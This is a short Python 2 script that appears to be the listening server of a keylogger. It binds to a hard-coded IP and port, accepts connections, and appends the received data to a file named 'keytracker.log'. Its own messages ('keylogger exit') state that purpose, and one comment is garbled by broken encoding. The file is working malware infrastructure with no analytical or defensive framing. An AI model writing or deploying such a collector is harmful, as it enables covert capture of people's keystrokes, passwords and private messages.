# -*- coding: utf-8 -*-
import socket
import threading
  
flag=True  
# �����IP���˿�
bind_ip = "59.78.26.99"
bind_port = 8080
  
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  
server.bind((bind_ip,bind_port))
  
server.listen(1)
  
print "[*] Listening on %s:%d" % (bind_ip,bind_port)
  
def handle_client(client_socket):
  
    request = client_socket.recv(1024)
  
    print "[*] Received:%s" % request
  
    #client_socket.send("ok!")
  
    #client_socket.close()
  
while True:
    cache=''
    client,addr = server.accept()
  
    print "[*] Accept connection from:%s:%d" % (addr[0],addr[1])
  
    #client_handler = threading.Thread(target=handle_client,args=(client,))
    
    #client_handler.start()
    while True:
        try:
            request = client.recv(1024)
            
            cache+=request
            if len(cache)>30:
            #print "[*] Received:%s" % request
                #print cache
                fp=open('f:/keytracker.log','a')
                fp.write(cache)
                fp.close()
                cache=''
        
            if not request:
                break
        except:
            print "keylogger exit "
            flag=False
            break
    if flag:    
        client.close()